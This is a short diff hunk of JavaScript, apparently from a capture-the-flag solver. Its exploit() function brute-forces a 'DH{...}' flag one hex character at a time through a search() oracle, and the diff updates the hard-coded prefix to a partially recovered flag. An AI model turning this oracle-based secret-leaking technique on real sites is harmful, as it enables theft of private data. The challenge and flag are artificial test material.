@@ -25,7 +25,7 @@
     }
     async function exploit() {
         let chars = "0123456789abcdef}"
-        let secret = "DH{";
+        let secret = "DH{22d1445ad68";
         while (!secret.includes("}")) {
             for (let c of chars) {
                 if (await search(secret + c)) {
